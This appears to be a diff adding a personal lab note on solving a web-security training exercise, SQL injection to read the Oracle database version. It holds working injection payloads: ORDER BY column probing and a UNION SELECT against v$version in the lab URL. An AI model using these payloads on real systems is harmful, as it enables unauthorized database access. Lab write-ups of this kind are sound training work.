@@ -1,0 +1,16 @@
+Lab: SQL injection attack, querying the database type and version on Oracle
+
+Number of columns:
+ORDER BY 1 and 2 work
+ORDER BY 3 returns internal server error
+
+' ORDER BY 2-- .. Orders by paragraph text
+' ORDER BY 1-- .. Orders by bolded header text
+
+Solved with following:
+https://ac591f251f6ded4ec0a6453a003200cd.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20null,%20banner%20FROM%20v$version--
+
+Datatable contains 2 rows, which is why I added null in select statement.
+Selected null, banner so that 2 fields are populated
+
+
